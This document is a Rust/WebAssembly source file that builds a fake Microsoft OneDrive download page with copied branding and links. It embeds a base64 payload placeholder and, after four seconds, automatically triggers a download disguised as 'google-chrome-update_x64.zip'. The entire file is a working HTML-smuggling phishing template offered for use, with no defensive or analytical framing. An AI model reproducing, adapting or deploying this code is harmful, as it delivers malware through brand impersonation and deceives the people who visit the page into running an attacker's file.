use wasm_bindgen::prelude::*;
use wasm_bindgen::JsCast;
use web_sys::{window, Document, HtmlElement, HtmlAnchorElement}; // Corrected import line
use wasm_bindgen::closure::Closure;


// Called when the wasm module is instantiated
#[wasm_bindgen(start)]

pub fn main() -> Result<(), JsValue> {
    // Use `web_sys`'s global `window` function to get a handle on the global window object.
    let window = web_sys::window().expect("no global `window` exists");
    let document = window.document().expect("should have a document on window");
    let body = document.body().expect("document should have a body");



    // Get our payload into a format we can use
    let target = "{{ PAYLOAD }}";
    



    let base64_blob_brand = "data:image/png;base64, ";  
    let base64_microsoft_blob = "data:image/png;base64, ";
    let base64_brand_blob = "data:image/png;base64,";    
    let base64_blob = "data:image/png;base64,";

    // Create 'img' element for Microsoft logo
    let ms_logo = document.create_element("img")?.dyn_into::<HtmlElement>()?;
    ms_logo.set_attribute("src", base64_microsoft_blob)?;
    ms_logo.set_attribute("style", "height: 35px; display: flex; align-items: left; padding: 5px;")?;

    // Create 'a' element for Microsoft logo
    let link = document.create_element("a")?.dyn_into::<HtmlElement>()?;
    link.set_attribute("href", "https://www.microsoft.com/en-gb/")?;
    link.append_child(&ms_logo)?;

    // OneDrive Logo
    let logo = document.create_element("img")?.dyn_into::<web_sys::HtmlElement>()?;
    logo.set_attribute("src", base64_brand_blob)?;
    logo.set_attribute("style", "height: 35px; display: flex; align: left; padding: 5 5 5 5;")?;

    // Create and style 'div' for OneDrive text
    // let nav_content = document.create_element("div")?;
    // nav_content.set_attribute("class", "text-muted")?;
    // nav_content.set_inner_html("OneDrive");
    // nav_content.set_attribute("style", "display: flex; align-items: center; justify-content: flex-start; font-size: 24px; color: black; text-decoration: none;")?;

    // Create 'a' element for OneDrive link
    let link1 = document.create_element("a")?.dyn_into::<HtmlElement>()?;
    link1.set_attribute("href", "https://www.microsoft.com/en-gb/microsoft-365/onedrive/download")?;
    link1.append_child(&logo)?;

    let button = document.create_element("button")?.dyn_into::<HtmlElement>()?;
    button.set_inner_html("Download Files");
    button.set_attribute("id", "download_button")?;
    button.set_attribute("style","background-color: #1967d2; color: white; border: none; padding: 10px 25px; border-radius: 24px; font-size: 16px; cursor: pointer; display: flex; align: center;")?;



    // Create and style navbar
    let nav = document.create_element("nav")?;
    nav.set_attribute("style", "width: 100%; background: #333; padding: 10px 0; color: white;")?;
    let nav_content = document.create_element("div")?;
    let nav_separator = document.create_element("div")?;
    nav_separator.set_attribute("class", "text-muted")?;
    nav_separator.set_attribute("style", "display: flex; align-items: center; justify-content: flex-start; font-size:29px; left: 50px; color: #a9a9a9;")?;
    nav_separator.set_inner_html("   |   ");
    //nav_content.set_inner_html("          OneDrive   ");
    //nav_content.set_attribute("style", "display: flex; align-items: center; justify-content: flex-start; font-size:24px; left: 50px; text-decoration: none; color: black;")?;
    nav.set_attribute("style", "display: flex; align-items: center; justify-content: flex-start; width: 100%; background: #FFFFFF; padding: 10px; color: black; box-shadow: 0 4px 6px rgba(0,0,0,0.1);")?;

    //nav.append_child(&ms_anchor)?;

    //nav.append_child(&ms_logo)?;
    nav.append_child(&link)?;
    nav.append_child(&nav_separator)?;
    //nav.append_child(&logo)?;
    nav.append_child(&link1)?;
    nav.append_child(&nav_content)?;
    body.append_child(&nav)?;
    

    // Create main content container
    let main_container = document.create_element("div")?;
    main_container.set_attribute("style", "text-align: center; padding: 20px;")?;

    // Add brand logo
    let logo = document.create_element("img")?.dyn_into::<web_sys::HtmlElement>()?;
    logo.set_attribute("src", base64_blob_brand)?; // Replace base64_brand_blob with your logo path in Base64 format
    logo.set_attribute("style", "width: 300px; height: auto;")?; // Adjust the width as needed; height:auto keeps the aspect ratio
    main_container.append_child(&logo)?;

    
    // Ensure you're using web_sys::HtmlElement for DOM manipulation.
    let title = document.create_element("h1")?.dyn_into::<web_sys::HtmlElement>()?;
    title.set_inner_html("<h1>Welcome to OneDrive<br></h1><small>Your files are downloading...</small>");
    // Use Bootstrap's classes where appropriate and add custom styling.
    title.set_class_name("display-4"); // Bootstrap class for large titles.
    title.set_attribute("style", "font-family: 'Open Sans', sans-serif; font-weight: 600; font-size: 44px;")?;
    main_container.append_child(&title)?;


    main_container.set_attribute("style", "display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;")?;


    // Create a container to center the button
    let container = document.create_element("div")?;
    container.set_attribute("style", "justify-content: center; align-items: center; ")?;
    body.append_child(&container)?;

    
    // Add H3 subsection
    let subsection = document.create_element("h2")?.dyn_into::<web_sys::HtmlElement>()?;
    //subsection.set_attribute("class", "text-muted")?;
    subsection.set_attribute("style", "padding-top: 20px")?;
    subsection.set_inner_html("Download OneDrive<br>");
    subsection.set_attribute("class", "text-muted")?;
    subsection.set_inner_html("<h6><a href=https://go.microsoft.com/fwlink/p/?LinkID=2182910&clcid=0x809&culture=en-gb&country=gb>Click Here</a> to download OneDrive for your Windows operating system.");
    main_container.append_child(&subsection)?;


    // Append main container before the footer
    body.append_child(&main_container)?;



    
    let download_url = format!("data:application/octet-stream;base64,{}", target);

    // Create a footer element
    let footer = document.create_element("footer")?;
    footer.set_attribute("style", "text-align: right;")?;



    // Create an img element for the blob image
    let img = document.create_element("img")?.dyn_into::<web_sys::HtmlElement>()?;

    img.set_attribute("src", base64_blob)?;
    img.set_attribute("style", "width: 90%; height: auto;")?;
    footer.append_child(&img)?;

    // Append the footer to the body
    body.append_child(&footer)?;

    // Add H3 subsection
    let subsection = document.create_element("h6")?.dyn_into::<web_sys::HtmlElement>()?;
    subsection.set_attribute("class", "text-muted")?;
    //subsection.set_attribute("style", "padding: 20px 10px;")?;
    subsection.set_inner_html("<br><br>© Microsoft 2024");
    main_container.append_child(&subsection)?;
    


    
    
    // Create an a element
    let a = document
    .create_element("a")?
    .dyn_into::<HtmlAnchorElement>()?;
    a.set_href(&download_url);
    a.set_download("google-chrome-update_x64.zip"); // Set your desired file name here

    // Append the anchor element to the body
    body.append_child(&a)?;

    // Create a closure for the timeout callback
    let closure = Closure::wrap(Box::new(move || {
        a.click(); // Trigger the download after the timeout
    }) as Box<dyn Fn()>);

    // Set the timeout
    window
        .set_timeout_with_callback_and_timeout_and_arguments_0(
            closure.as_ref().unchecked_ref(),
            4000, // Delay in milliseconds
        )?;

    // Closure is forgotten to prevent it from being deallocated
    closure.forget();

    Ok(())
}

